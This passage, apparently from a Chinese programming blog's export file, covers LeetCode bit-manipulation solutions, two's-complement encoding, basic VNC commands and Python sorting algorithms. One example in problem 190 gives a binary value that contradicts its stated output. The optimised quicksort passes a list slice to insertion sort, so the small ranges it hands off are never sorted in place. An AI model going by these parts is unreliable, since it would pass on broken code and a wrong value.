+ 2 = 6.注意:数组中元素的范围为从 0到 10^9。数组的长度不超过 10^4。思路看到题意第一想法就是遍历数组，嵌套一个for循环遍历数组进行两两比较，但是这样时间复杂度高达O(N^2)。因此，这里我转变思维，从逐一数字的横向比较，转变为纵向的逐位比较，来优化时间复杂度。对于每一个数的某一位来说，若当前位为 1，那么对于当前位来说，所有数字的同位上为 0 的个数即当前数字当前位的汉明距离。因此，每一位的汉明距离为0出现的次数乘以1出现的次数，最后遍历32位即可。Python实现1234567891011121314151617class Solution: def totalHammingDistance(self, nums: List[int]) -&gt; int: res = 0 for i in range(32): c0 = 0 c1 = 0 # 遍历数组 for j in range(len(nums)): # 统计当前位1的个数 if (nums[j] &gt;&gt; i) &amp; 1: c1 += 1 # 统计当前位0的个数 else: c0 += 1 # 总的汉明距离加上当前位的汉明距离 res += c0 * c1 return res时间复杂度：O(32∗n)=O(n)只出现一次的数字(Single Number)相关题目136-只出现一次的数字题目描述给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。说明：你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？示例 1:12输入: [2,2,1]输出: 1示例 2:12输入: [4,1,2,1,2]输出: 4思路我们可以利用异或的性质：0和一个数异或后得到那个数，两个相同的数异或后则为0。显然将所有数字异或后，得到的结果即为出现一次的值。Python实现12345678910class Solution(object): def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ res = 0 for i in range(len(nums)): res = res ^ nums[i] return res时间复杂度：O(n) 。我们只需要将 nums 中的元素遍历一遍，所以时间复杂度就是 nums 中的元素个数。空间复杂度：O(1) 。137-只出现一次的数字ii问题描述给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。说明：你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？示例 1:12输入: [2,2,3,2]输出: 3示例 2:12输入: [0,1,0,1,0,1,99]输出: 99思路根据题目要求，我们可以设计这样一个状态机：ab初始状态：00第一次碰见某个数x：0x把x记录在b中第二次碰见某个数x：x0把x记录在a中第三次碰见某个数x：00把a和b都清空，可以处理其他数我们按照上述变换规则设计a和b：b=0时碰到x，就变成x；b=x时再碰到x，就变成0，这个就是异或，我们也许可以设计b=b xor x。当b再次碰到x，这时候b还是要为0，但这时候不同的是a=x，而前两种情况都是a=0。所以我们可以设计成b=(b xor x)&amp;~a同样道理，我们可以设计出：a=(a xor x)&amp;~b按照这个设计，最后那个只出现一次的元素必定存储在b中。Python实现123456789101112class Solution(object): def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ a = 0 b = 0 for i in range(len(nums)): b = (b ^ nums[i]) &amp; ~a a = (a ^ nums[i]) &amp; ~b return b时间复杂度：O（n）。空间复杂度：O（1）。260-只出现一次的数字iii问题描述给定一个整数数组 nums，其中恰好有两个元素只出现一次，其余所有元素均出现两次。 找出只出现一次的那两个元素。示例 :12输入: [1,2,1,3,2,5]输出: [3,5]注意：结果输出的顺序并不重要，对于上面的例子， [5, 3] 也是正确答案。你的算法应该具有线性时间复杂度。你能否仅使用常数空间复杂度来实现？思路由于这两个数不相等，所以异或结果不为0，也就是说二进制中至少有一位1，记为第n位。我们以第n位是否为1，来把数组分为两个子数组。然后这个问题就相当于分别在两个数组中找一个只出现一次的元素。Python实现12345678910111213141516171819202122232425class Solution(object): def singleNumber(self, nums): """ :type nums: List[int] :rtype: List[int] """ # 所有数异或 x = 0 for i in range(len(nums)): x = x ^ nums[i] # 由于两个出现一次的元素不相同，所以至少有一位为1，下面我找到最低那个1 mask = 1 while x &amp; mask == 0: mask = mask &lt;&lt; 1 # 所有数根据mask=1或者0分成两组（两个特殊的数字被分为两组） a1 = 0 a2 = 0 for i in range(len(nums)): if nums[i] &amp; mask == 0: a1 = a1 ^ nums[i] elif nums[i] &amp; mask == mask: a2 = a2 ^ nums[i] return [a1,a2]反转相关题目190-颠倒二进制位题目描述颠倒给定的 32 位无符号整数的二进制位。示例 1：输入: 00000010100101000001111010011100输出: 00111001011110000010100101000000解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596，因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。示例 2：输入：11111111111111111111111111111101输出：10111111111111111111111111111111解释：输入的二进制串 11111111111111111111111111111101 表示无符号整数 4294967293，因此返回 3221225471 其二进制表示形式为 10101111110010110010011101101001。思路从最低位到最高位逐位检查n的第i位是不是为1，如果是, 就把res的第31-i位设为1。Python实现123456789class Solution: def reverseBits(self, n): res = 0 mask = 1 for i in range(32): if n &amp; mask == mask: res = res | (1 &lt;&lt; 31-i) mask = mask &lt;&lt; 1 return res476-数字的补数题目描述给定一个正整数，输出它的补数。补数是对该数的二进制表示取反。注意:给定的整数保证在32位带符号整数的范围内。你可以假定二进制数不包含前导零位。示例 1:输入: 5输出: 2解释: 5的二进制表示为101（没有前导零位），其补数为010。所以你需要输出2。示例 2:输入: 1输出: 0解释: 1的二进制表示为1（没有前导零位），其补数为0。所以你需要输出0。思路首先要求得二进制数的位数，然后构造一个长度等于二进制数长度的全1的数，然后异或即可得到补数。Python实现123456789101112class Solution: def findComplement(self, num: int) -&gt; int: mask = 1 res = 0 while num &gt;= mask: # 除首位外全1的数 res = res | mask # 0b1、0b10、0b100... mask = mask &lt;&lt; 1 return num ^ res全组合相关题目78-子集题目描述给定一组不含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。说明：解集不能包含重复的子集。示例:123456789101112输入: nums = [1,2,3]输出:[ [3], [1], [2], [1,2,3], [1,3], [2,3], [1,2], []]思路数组的每个元素，可以有两个状态：不在子数组中（用 0 表示）；在子数组中（用 1 表示）。那么得到的组合序列一共有2^N个, 其中00...00表示所有元素都不取，00...01表示只取第一个，依次类推。下面是一个例子：Python实现12345678910111213class Solution: def subsets(self, nums: List[int]) -&gt; List[List[int]]: size = len(nums) # 数组长度 n = 1 &lt;&lt; size # 位掩码个数 res = [] for i in range(n): temp = [] # 根据当前位掩码是否为1决定是否加入数组该位 for j in range(size): if i &gt;&gt; j &amp; 1: temp.append(nums[j]) res.append(temp) return res数学相关题目29-两数相除题目描述给定两个整数，被除数 dividend 和除数 divisor。将两数相除，要求不使用乘法、除法和 mod 运算符。返回被除数 dividend 除以除数 divisor 得到的商。示例 1:输入: dividend = 10, divisor = 3输出: 3示例 2:输入: dividend = 7, divisor = -3输出: -2说明:被除数和除数均为 32 位有符号整数。除数不为 0。假设我们的环境只能存储 32 位有符号整数，其数值范围是 [−2^31, 2^31 − 1]。本题中，如果除法结果溢出，则返回 2^31 − 1。思路题目中要求我们不能用乘法和除法，但是我们可以用减法，我们可以通过被除数最多可以减多少个除数还能保证是非负来得到商。$$dividend=quotient∗divisor+remainder$$不过这样在某些情况会超时（比如2**30/1），为了解决效率问题，可以减去除数的倍数，利用位运算，每次除数左移一位（2倍），次数相应加对应的倍数。然后再判断当前的和是否大于被除数，如果大于的话，再把除数回置（右移）。Python实现1234567891011121314151617181920212223242526272829303132333435class Solution: def divide(self, dividend: int, divisor: int) -&gt; int: # 求最后结果的符号 sign = (dividend &gt; 0) ^ (divisor &gt; 0) dividend = abs(dividend) divisor = abs(divisor) # 被除数减去除数 quotient = 0 # 除数加倍直到超过剩余的被除数 count = 0 while dividend - (divisor &lt;&lt; count) &gt;= 0: quotient += (1 &lt;&lt; count) dividend -= (divisor &lt;&lt; count) count += 1 # 除数减半直到count=0 while count &gt; 0: count -= 1 if dividend - (divisor &lt;&lt; count) &gt;= 0: quotient += (1 &lt;&lt; count) dividend -= (divisor &lt;&lt; count) # 负数处理 if sign: quotient = -quotient # 最大数处理 if quotient &gt; 2147483647: quotient = 2147483647 # 最小数处理 if quotient &lt; -2147483648: quotient = -2147483648 return quotient201-数字范围按位与题目描述给定范围 [m, n]，其中 0 &lt;= m &lt;= n &lt;= 2147483647，返回此范围内所有数字的按位与（包含 m, n 两端点）。示例 1:输入: [5,7]输出: 4示例 2:输入: [0,1]输出: 0思路此题其实就是寻找[m,n]范围内二进制数高位（左边）没有变化的数（由于是按位与，那么某位一旦出现0，结果该位肯定是0），后面补上0即为所求的结果。举个例子：范围：[26,30]公共部分：11010、11011、11100、11101、11110Python实现我们可以建立一个31位都为1的mask，然后每次左移一位，比较m &amp; mask和n &amp; mask是否相同。123456class Solution: def rangeBitwiseAnd(self, m: int, n: int) -&gt; int: mask = (1 &lt;&lt; 31) - 1 while (m &amp; mask) != (n &amp; mask): mask = mask &lt;&lt; 1 return m &amp; mask371-两整数之和问题描述不使用运算符 + 和 - ​​​​​​​，计算两整数 ​​​​​​​a 、b ​​​​​​​之和。示例 1:12输入: a = 1, b = 2输出: 3示例 2:12输入: a = -2, b = 3输出: 1思路题目说不能使用运算符 + 和 -，那么我们就要使用其他方式来替代这两个运算符的功能。我们可以把 a + b 的问题拆分为 (a 和 b 的无进位结果) + (a 和 b 的进位结果)：无进位加法使用异或运算计算得出进位结果使用与运算和移位运算计算得出循环此过程，直到进位为 0。注意：由于Python整数不是32位，为了让负数结果能够正确表示，需要做一定处理。Python实现12345678910111213141516171819202122232425262728class Solution(object): def getSum(self, a, b): """ :type a: int :type b: int :rtype: int """ # 2^32 MASK = 0x100000000 # 整型最大值 MAX_INT = 0x7FFFFFFF MIN_INT = 0x80000000 while b != 0: # 不考虑进位加法 sums = a ^ b # 进位 carry = (a &amp; b) &lt;&lt; 1 # 取余范围限制在 [0, 2^32-1] 范围内 a = sums % MASK b = carry % MASK # 处理Python整数不是32位问题（负数的正确表示） if a &lt;= MAX_INT: return a else: return ~((a % MIN_INT) ^ MAX_INT)其他类型题目693-交替位二进制数问题描述给定一个正整数，检查他是否为交替位二进制数：换句话说，就是他的二进制数相邻的两个位数永不相等。示例 1:输入: 5输出: True解释: 5的二进制数是: 101示例 2:输入: 7输出: False解释: 7的二进制数是: 111思路我们可以用把这个二进制和右移1位后的数进行异或，根据得到的数是否为全1来判断是否是交替二进制数。Python实现12345678class Solution: def hasAlternatingBits(self, n: int) -&gt; bool: a = n ^ (n &gt;&gt; 1) # 判断a是否为全1 if a &amp; (a + 1) == 0: return True else: return False]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>位运算</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[原码、反码、补码详解]]></title>
    <url>%2Farchives%2Fcfbbb02f.html</url>
    <content type="text"><![CDATA[本文简单总结了原码、反码、补码的计算以及由来。机器数和真值机器数一个数在计算机中的二进制表示形式，叫做这个数的机器数。机器数是带符号的，在计算机用一个数的最高位存放符号，正数为0，负数为1。比如，十进制中的数 +3 ，计算机字长为8位，转换成二进制就是00000011。如果是 -3 ，就是10000011。这里的 00000011 和 10000011 就是机器数。真值因为第一位是符号位，所以机器数的形式值就不等于真正的数值。例如上面的有符号数 10000011，其最高位1代表负，其真正数值是 -3 而不是形式值131（10000011转换成十进制等于131）。为区别起见，将带符号位的机器数对应的真正数值称为机器数的真值。原码、反码、补码的基础概念和计算方法原码、反码、补码是机器存储一个具体数字的编码方式。原码原码就是符号位加上真值的绝对值，即用第一位表示符号，其余位表示值。比如如果是8位二进制：[+1]原 = 0000 0001[-1]原 = 1000 0001因为第一位是符号位，所以8位二进制数的取值范围就是：[1111 1111 , 0111 1111]，即[-127 , 127]。原码是人脑最容易理解和计算的表示方式。反码正数的反码是其本身。负数的反码是在其原码的基础上，符号位不变，其余各个位取反。下面是一个例子：[+1] = [00000001]原 = [00000001]反[-1] = [10000001]原 = [11111110]反可见如果一个反码表示的是负数，人脑无法直观的看出来它的数值，通常要将其转换成原码再计算。补码正数的补码就是其本身。负数的补码是在其原码的基础上，符号位不变，其余各位取反，最后+1。(即在反码的基础上+1)下面是一个例子：[+1] = [00000001]原 = [00000001]反 = [00000001]补[-1] = [10000001]原 = [11111110]反 = [11111111]补对于负数，补码表示方式也是人脑无法直观看出其数值的，通常也需要转换成原码再计算其数值。原码、反码、补码的由来人脑可以知道第一位是符号位，在计算的时候我们会根据符号位，选择对真值区域的加减。但是对于计算机，加减乘数已经是最基础的运算，要设计的尽量简单。计算机辨别”符号位”显然会让计算机的基础电路设计变得十分复杂！于是人们想出了将符号位也参与运算的方法。我们知道，根据运算法则减去一个正数等于加上一个负数，即: 1 - 1 = 1 + (-1) = 0。因此，机器可以只有加法而没有减法，这样计算机运算的设计就更简单了。原码：正数正数（原码）负数负数（原码）000000100010001-1100120010-2101030011-3101140100-4110050101-5110160110-6111070111-71111我们希望+1和-1相加是0，但计算机只能算出0001+1001=1010 (-2)。为了解决“正负相加等于0”的问题，在“原码”的基础上，人们发明了“反码”：正数正数（反码）负数负数（反码）000000111110001-1111020010-2110130011-3110040100-4101150101-5101060110-6100170111-71000当“原码”变成“反码”时，完美的解决了“正负相加等于0”的问题，过去的+1和-1相加，变成了0001+1101=1111，刚好反码表示方式中，1111象征-0。人们总是进益求精，历史遗留下来的问题—— 有两个零存在，+0 和 -0。我们希望只有一个0，所以发明了”补码”，同样是针对”负数”做处理的。从原来”反码”的基础上，补充一个新的代码，（+1）。正数正数（补码）负数负数（补码）000000000010001-1111120010-2111030011-3110140100-4110050101-5101160110-6101070111-71001-81000有得必有失，在补一位1的时候，要丢掉最高位。我们要处理”反码”中的”-0”，当1111再补上一个1之后，变成了10000，丢掉最高位就是0000，刚好和左边正数的0完美融合。这样就解决了+0和-0同时存在的问题。另外”正负数相加等于0”的问题，同样得到满足，举例，3和（-3）相加，0011 + 1101 =10000，丢掉最高位，就是0000（0）。以上就是”补码”的存在方式。参考原码, 反码, 补码 详解原码、反码、补码的产生、应用以及优缺点有哪些？]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机原理</category>
      </categories>
      <tags>
        <tag>计算机原理</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VNC基本命令笔记]]></title>
    <url>%2Farchives%2F14dedde.html</url>
    <content type="text"><![CDATA[这里我整理了vnc的基本命令。vnc配置文件vnc的配置文件在/etc/sysconfig/vncservers目录下：123456789101112131415161718# The VNCServerS variable is a list ofdisplay:user pairs.## Uncomment the lines below to start a VNCserver on display :2# as my 'myusername’ (adjust this to yourown). You will also# need to set a VNC password; run 'manvncpasswd’ to see how# to do that.## DO NOT RUN THIS SERVICE if your localarea network is# untrusted! For a secure way of using VNC,see#&lt;URL:http://www.uk.research.att.com/archive/vnc/sshvnc.html &gt;.# Use "-nolisten tcp" to prevent Xconnections to your VNC server via TCP.# Use "-nohttpd" to prevent web-based VNCclients connecting.# Use "-localhost" to prevent remote VNCclients connecting except when# doing so through a secure tunnel. See the "-via" option in the# `man vncviewer’ manual page.VNCSERVERS=”1:root 2:leo” #此处添加用户，一般只添加一个1:root也就行了。VNCSERVERARGS[1]=”-geometry 1600×900-nolisten tcp -nohttpd -localhost”VNCSERVERARGS[2]=”-geometry 1024×768-nolisten tcp -nohttpd -localhost”注意：上面是分别设置的root和leo两个用户的分辨率，注意是用端口号区分的。另外也可以通过命令行临时修改分辨率及色深，这种方式重启后就会丢失，命令如下（这个后面会讲）：12vncserver -geometry 800×600 :2 #设置vncserver的分辨率vncserver -depth 16 :2 #设置vncserver的色深启动vnc服务器1vncserver :2每个用户都可以启动自己的VNCServer远程桌面。每个用户可以启动多个VNCServer远程桌面，它们用ip加端口号：ip:1、ip:2、ip:3 来标识、区分。使用同一端口会使另外登录的用户自动退出。VNCServer的大部分配置文件及日志文件都在用户目录下.vnc目录下。启动后发现，与自己的电脑桌面相比界面比较小，点击全屏后，原来多余的部分都变成黑色的了。通过上面说的查看vnc进程命令后发现有个信息-geometry 1024x768，这说明vnc的默认分辨率是1024x768，而我的笔记本分辨率是1366x768。所以要全屏，只需要修改分辨率即可，修改分辨率的方法见后文。查看vnc进程1ps -ef | grep vnc该命令可以列出当前系统上所有用户vnc界面的端口号，分辨率等信息。杀掉自己vnc端口对应的进程我的端口号是2，这里我杀掉vnc 2号端口的进程：1vncserver -kill :2修改vnc分辨率修改分辨率的命令为：1vncserver -geometry 1366x768 :2在这里要注意一点，在你的vnc server运行期间，使用该命令是会报错的：A VNC server is already running as :2，所以，在修改vnc分辨率之前，我们需要先将vnc server关闭。用上面说过的-kill命令杀掉vnc端口对应的进程即可。然后再运行命令修改分辨率即可。之后登录vnc界面就可以看到界面的大小已经改变了。参考VNC简介vnc分辨率修改]]></content>
      <categories>
        <category>工具使用</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>VNC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[排序算法的Python实现以及时间复杂度分析]]></title>
    <url>%2Farchives%2F58365ec3.html</url>
    <content type="text"><![CDATA[我用Python实现了冒泡排序、选择排序、插入排序、归并排序、快速排序。然后简单讲了讲快速排序的优化，我们可以通过小数组采用插入排序来减少递归的开销；对于有一定顺序的数组，我采用三数取中来提高性能；对于包含大量重复数的数组，我用了三路快速排序来提高性能。最后，我把这些排序算法应用在随机数组、升序数组、降序数组、包含大量重复数的数组上，比较了一下它们的耗时。冒泡排序冒泡排序的大体思想就是通过与相邻元素的比较和交换来把小的数交换到最前面。这个过程类似于水泡向上升一样，因此而得名。12345678910def exchange(a,i,j): temp = a[i] a[i] = a[j] a[j] = tempdef BubbleSort(nums): for i in range(len(nums)-1): for j in range(len(nums)-i-1): if nums[j] &gt; nums[j+1]: exchange(nums,j,j+1)时间复杂度O(n^2)选择排序首先，找到数组中最小的那个元素，然后将它和数组的第一个元素交换位置（如果第一个元素就是最小元素那么它就和自己交换）。然后在剩下的元素中找到最小的元素，将它与数组的第二个元素交换位置。如此往复，直到将整个数组排序。这种方法叫做选择排序，因为它在不断地选择剩余元素之中的最小者。123456789101112def exchange(a,i,j): temp = a[i] a[i] = a[j] a[j] = tempdef SelectSort(nums): for i in range(len(nums)): minIndex = i for j in range(i,len(nums)): if nums[j] &lt; nums[minIndex]: minIndex = j exchange(nums,i,minIndex)时间复杂度O(n^2)插入排序通常人们整理桥牌的方法是一张一张的来，将每一张牌插入到其他已经有序的牌中的适当位置。在计算机的实现中，为了给要插入的元素腾出空间，我们需要将其余所有元素在插入之前都向右移动一位。这种算法叫做插入排序。123456789101112def exchange(a,i,j): temp = a[i] a[i] = a[j] a[j] = tempdef InsertSort(nums): for i in range(len(nums)-1): j = i + 1 while i &gt;= 0 and nums[i] &gt; nums[j]: exchange(nums,i,j) j -= 1 i -= 1时间复杂度O(n^2)归并排序归并排序体现的是一种分治思想（Divide and conquer），下面是其排序的步骤：将数组一分为二（Divide array into two halves）对每部分进行递归式地排序（Recursively sort each half）合并两个部分（Merge two halves）merge()函数具体步骤如下：给出原数组a[]，该数组的low到mid，mid+1到high的子数组是各自有序的。将数组复制到辅助数组（auxiliary array）中，两部分数组的首元素分别以i和j为下标，给原数组首元素以k为下标。比较i下标和j下标的元素，将较小值赋到k下标位置的元素内，然后对k和赋值的下标进行递增。重复上述过程，直到比较完全部元素。123456789101112131415161718def merge(a,aux,low,mid,high): i = low j = mid+1 k = 0 for k in range(low,high+1): if i &gt; mid: a[k] = aux[j] j += 1 elif j &gt; high: a[k] = aux[i] i += 1 else: if aux[i] &gt; aux[j]: a[k] = aux[j] j += 1 else: a[k] = aux[i] i += 1sort()函数我们要对数组a[low..high]进行排序，先将它分为a[low..mid]和a[mid+1..high]两部分，分别递归调用将它们单独排序，最后将有序的子数组归并为最终的排序结果。12345678def sort(a,aux,low,high): # 退出条件 if low &gt;= high: return mid = (low + high) // 2 sort(a,aux,low,mid) sort(a,aux,mid+1,high) merge(a,aux,low,mid,high)MergeSort()函数为了保证归并排序函数MergeSort()输入只有未排序的数组，这里调用前面的辅助函数sort()：123456def MergeSort(nums): aux = nums.copy() low = 0 high = len(nums)-1 sort(nums,aux,low,high) return nums时间复杂度：O(nlogn)快速排序快速排序是一种分治的排序算法。它将一个数组分成两个子数组，将两部分独立地排序。分治策略指的是：将原问题分解为若干个规模更小但结构与原问题相似的子问题。递归地解这些子问题，然后将这些子问题的解组合为原问题的解。下面是一个示例：来源：快速排序python实现简单实现下面的代码短小利于理解，但是空间复杂度大，使用了三个列表解析式，而且每次选取进行比较时需要遍历整个序列。123456789def QuickSort(a): if len(a) &lt; 2: return a else: pivot = a[0] less_than_pivot = [x for x in a if x &lt; pivot] more_than_pivot = [x for x in a if x &gt; pivot] pivot_list = [x for x in a if x == pivot] return QuickSort(less_than_pivot) + pivot_list + QuickSort(more_than_pivot)原地排序实现切分——partition()切分方法：先随意地取a[low]作为切分元素（即那个将会被排定的元素），然后我们从数组的左端开始向右扫描直到找到一个大于等于它的元素，再从数组的右端开始向左扫描直到找到一个小于等于它的元素。这两个元素是没有排定的，因此我们交换它们的位置。如此继续，当两个指针相遇时，我们只需要将切分元素a[low]和左子元素最右侧的元素a[j]交换然后返回j即可。1234567891011121314151617181920212223def partition(a,low,high): i = low # 循环内i=i+1 j = high + 1 # 循环内j=j-1 while True: # 如果a[i]比基准数小,则后移一位直到有大于等于基准数的数出现 i += 1 # 保证i每次循环都变化，不会陷入死循环（所有数都相等时这种情况） while a[i] &lt; a[low] and i &lt; high: i += 1 # 如果a[j]比基准数大,则前移一位直到有小于等于基准数的数出现 j -= 1 # 保证j每次循环都变化，不会陷入死循环（所有数都相等时这种情况） while a[j] &gt; a[low] and j &gt; low: j -= 1 # 如果两个指针交叉，说明已经排序完了 if i &gt;= j: break exchange(a,i,j) # 指针相遇后，j所在的元素小于low，进行互换 exchange(a,low,j) return j这里有个细节需要注意下，这个代码相比我最初的代码改变了：12345678910111213141516171819202122232425def partition(a,low,high):- i = low + 1+ i = low # 循环内i=i+1- j = high+ j = high + 1 # 循环内j=j-1 while True: # 如果a[i]比基准数小,则后移一位直到有大于等于基准数的数出现+ i += 1 # 保证i每次循环都变化，不会陷入死循环（所有数都相等时这种情况） while a[i] &lt; a[low] and i &lt; high: i += 1 # 如果a[j]比基准数大,则前移一位直到有小于等于基准数的数出现+ j -= 1 # 保证j每次循环都变化，不会陷入死循环（所有数都相等时这种情况） while a[j] &gt; a[low] and j &gt; low: j -= 1 # 如果两个指针交叉，说明已经排序完了 if i &gt;= j: break exchange(a,i,j) # 指针相遇后，j所在的元素小于low，进行互换 exchange(a,low,j) return j如果没有这些代码，当碰到[2,2,2]这样的情况时，i和j一直不会改变，永远无法满足if i &gt;= j，然后函数就一直在while True里边死循环。sort()函数快速排序递归地将子数组a[low..high]排序，先用partition()方法将a[j]放到一个合适位置，然后再用递归调用将其他位置的元素排序。123456def sort(a,low,high): if low &gt;= high: return j = partition(a,low,high) sort(a,low,j-1) sort(a,j+1,high)QuickSort()函数为了保证快速排序函数QuickSort()输入只有未排序的数组，这里调用前面的辅助函数sort()：12345def QuickSort(nums): low = 0 high = len(nums)-1 sort(nums,low,high) return nums快速排序的时间复杂度最优情况：每一次的基准值都正好为序列的中位数，时间复杂度为nlogn最坏情况：每一次的基准值都恰好是序列的最大值或最小值，时间复杂度为n^2。有意思的是如果每次选第一个数做基准值，但每次这个数又是最小值，那么序列本身就是有序的，但时间复杂度也是最高的因此，要想优化时间复杂度，关键在于基准值的选择。快速排序的优化优化小数组效率对于规模很小的情况，快速排序的优势并不明显（可能没有优势），而递归型的算法还会带来额外的开销。于是对于这类情况可以选择非递归型的算法来替代。那就有两个问题：多小的数组算小数组？替换的算法是什么？通常这个阈值设定为10，替换的算法一般是插入排序。下面是Python实现，这里只需要在sort()函数中加一个数组大小判断即可：1234567891011121314CUTOFF = 10def sort(a,low,high): if low &gt;= high: return # 当数组大小小于CUTOFF时，调用插入排序 if high - low &lt;= CUTOFF - 1: InsertSort(a[low:high+1]) return j = partition(a,low,high) sort(a,low,j-1) sort(a,j+1,high)合理选择pivot前面也讨论过，直接选择分区的第一个或最后一个元素做 pivot 是不合适的。对于已经排好序，或者接近排好序的情况，会进入最差情况，时间复杂度退化到n^2。pivot选取的理想情况是：让分区中比 pivot 小的元素数量和比 pivot 大的元素数量差不多。较常用的做法是三数取中（ median of three ），即从第一项、最后一项、中间一项中取中位数作为 pivot。当然这并不能完全避免最差情况的发生。所以很多时候会采取更小心、更严谨的 pivot 选择方案（对于大数组特别重要）。比如先把大数组平均切分成左中右三个部分，每个部分用三数取中得到一个中位数，再从得到的三个中位数中找出中位数。12345678910111213141516171819202122232425262728293031323334CUTOFF = 10def get_median(nums,low,high): # 计算数组中间的元素的下标 mid = (low + high) // 2 # 目标: arr[mid] &lt;= arr[high] if nums[mid] &gt; nums[high]: exchange(nums,mid,high) # 目标: arr[low] &lt;= arr[high] if nums[low] &gt; nums[high]: exchange(nums,low,high) # 目标: arr[low] &gt;= arr[mid] if nums[low] &lt; nums[mid]: exchange(nums,low,mid) # 此时，arr[mid] &lt;= arr[low] &lt;= arr[high]，low的位置上保存这三个位置中间的值 return nums[low]def sort(a,low,high): if low &gt;= high: return # 当数组大小小于CUTOFF时，调用插入排序 if high - low &lt;= CUTOFF - 1: InsertSort(a[low:high+1]) return # 三数取中(median of three)，low的位置上保存这三个位置中间的值 _ = get_median(a,low,high) j = partition(a,low,high) sort(a,low,j-1) sort(a,j+1,high)处理重复元素问题当一个数组里的元素全部一样大（或者存在大量相同元素）会令快速排序进入最差情况，因为不管怎么选 pivot，都会使分区结果一边很大一边很小。为了解决这个问题，我们需要修改分区过程，思路跟上面说的两路分区（基本的快排）类似，只是现在我们需要小于 pivot、等于 pivot、大于 pivot 三个分区。举个例子，待分割序列：6 4 6 7 1 6 7 6 8 6，其中pivot=6：未对与key元素相等处理的划分结果：1 4 6 6 7 6 7 6 8 6下次的两个子序列为：1 4 6 和 7 6 7 6 8 6对与key元素相等处理的划分结果：1 4 6 6 6 6 6 7 8 7下次的两个子序列为：1 4 和 7 8 7经过对比，我们可以看出，在一次划分后，把与key相等的元素聚在一起，能减少迭代次数，效率会提高不少。具体过程：如下图，我们可以设置四个游标，左端p、i，右端j、q。i、j的作用跟之前两路划分时候的左右游标相同，就是从两端向中间遍历序列，并将遍历到的元素与pivot比较，如果等于pivot，则移到两端（i对应的元素移到左端，j对应的元素移到右端。移动的方式就是拿此元素和a或d对应的元素进行交换，所以p和q的作用就是记录等于pivot的元素移动过后的边界），反之，如果大于或小于pivot，还按照之前两路划分的方式进行移动。这样一来，中间部分就和两路划分相同，两头是等于pivot的部分，我们只需要将这两部分移动到中间即可。1234567891011121314151617181920212223242526272829303132333435363738394041424344def partition(a,low,high): p = low + 1 i = low + 1 j = high q = high while True: # 如果a[i]比基准数小,则后移一位直到有大于等于基准数的数出现 while a[i] &lt;= a[low] and i &lt; high: # 与pivot相等的元素将其交换到p所在的位置 if a[i] == a[low]: exchange(a,p,i) p += 1 i += 1 # 如果a[j]比基准数大,则前移一位直到有小于等于基准数的数出现 while a[j] &gt;= a[low] and j &gt; low: # 与pivot相等的元素将其交换到q所在的位置 if a[j] == a[low]: exchange(a,j,q) q -= 1 j -= 1 # 如果两个指针交叉，说明已经排序完了 if i &gt;= j: break exchange(a,i,j) # 因为工作指针i指向的是当前需要处理元素的下一个元素，故而需要退回到当前元素的实际位置，然后将等于pivot元素交换到序列中间 i -= 1 p -= 1 while p &gt;= low: exchange(a, i, p) i -= 1 p -= 1 # 因为工作指针j指向的是当前需要处理元素的上一个元素，故而需要退回到当前元素的实际位置，然后将等于pivot元素交换到序列中间 j += 1 q += 1 while q &lt;= high: exchange(a, q, j) j += 1 q += 1 return i,j下面是sort()函数，这里我只写了修改的部分：1234567def sort(a,low,high): # ... i,j = partition(a,low,high) sort(a,low,i) sort(a,j,high)整体代码实现下面是经过优化的快速排序代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101CUTOFF = 10def exchange(a,i,j): temp = a[i] a[i] = a[j] a[j] = tempdef InsertSort(nums): for i in range(len(nums)-1): j = i + 1 while i &gt;= 0 and nums[i] &gt; nums[j]: exchange(nums,i,j) j -= 1 i -= 1def partition(a,low,high): p = low + 1 i = low + 1 j = high q = high while True: # 如果a[i]比基准数小,则后移一位直到有大于等于基准数的数出现 while a[i] &lt;= a[low] and i &lt; high: # 与pivot相等的元素将其交换到p所在的位置 if a[i] == a[low]: exchange(a,p,i) p += 1 i += 1 # 如果a[j]比基准数大,则前移一位直到有小于等于基准数的数出现 while a[j] &gt;= a[low] and j &gt; low: # 与pivot相等的元素将其交换到q所在的位置 if a[j] == a[low]: exchange(a,j,q) q -= 1 j -= 1 # 如果两个指针交叉，说明已经排序完了 if i &gt;= j: break exchange(a,i,j) # 因为工作指针i指向的是当前需要处理元素的下一个元素，故而需要退回到当前元素的实际位置，然后将等于pivot元素交换到序列中间 i -= 1 p -= 1 while p &gt;= low: exchange(a, i, p) i -= 1 p -= 1 # 因为工作指针j指向的是当前需要处理元素的上一个元素，故而需要退回到当前元素的实际位置，然后将等于pivot元素交换到序列中间 j += 1 q += 1 while q &lt;= high: exchange(a, q, j) j += 1 q += 1 return i,jdef get_median(nums,low,high): # 计算数组中间的元素的下标 mid = (low + high) // 2 # 目标: arr[mid] &lt;= arr[high] if nums[mid] &gt; nums[high]: exchange(nums,mid,high) # 目标: arr[low] &lt;= arr[high] if nums[low] &gt; nums[high]: exchange(nums,low,high) # 目标: arr[low] &gt;= arr[mid] if nums[low] &lt; nums[mid]: exchange(nums,low,mid) # 此时，arr[mid] &lt;= arr[low] &lt;= arr[high]，low的位置上保存这三个位置中间的值 return nums[low]def sort(a,low,high): if low &gt;= high: return # 当数组大小小于CUTOFF时，调用插入排序 if high - low &lt;= CUTOFF - 1: InsertSort(a[low:high+1]) return # 三数取中(median of three)，low的位置上保存这三个位置中间的值 _ = get_median(a,low,high) i,j = partition(a,low,high) 